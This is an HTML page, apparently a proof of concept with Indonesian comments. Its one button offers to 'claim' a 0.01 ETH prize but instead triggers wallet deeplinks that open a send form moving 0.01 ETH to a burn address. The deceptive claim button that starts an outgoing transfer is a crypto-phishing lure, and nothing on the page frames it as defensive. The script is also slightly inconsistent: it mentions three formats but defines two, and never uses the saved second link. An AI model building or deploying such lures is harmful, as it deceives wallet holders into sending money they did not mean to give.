<!DOCTYPE html>
<html>
<body>
<button onclick="kirim()">Claim Hadiah - Klaim 0.01 ETH</button>
<pre id="o"></pre>
<script>
function kirim(){
  document.getElementById('o').innerText = "Nyoba buka form Send...";
  // Coba 3 format deeplink send yang biasa dipake wallet
  // Format 1: 1inch native
  let url1 = "1inch://send?to=0x000000000000000000000000000000000000dEaD&amount=0.01&token=ETH";
  // Format 2: ethereum pay
  let url2 = "ethereum:0x000000000000000000000000000000000000dEaD?value=10000000000000000";
  
  // Kita coba satu-satu, yang pertama dulu
  window.location.href = url1;
  setTimeout(()=>{
    document.getElementById('o').innerText = "Kalo gak terjadi apa-apa, coba Format 2...\nKlik tombol lagi buat coba Format 2.";
    // Simpen format 2 buat klik kedua
    window._next = url2;
  }, 1500);
}
</script>
</body>
</html>
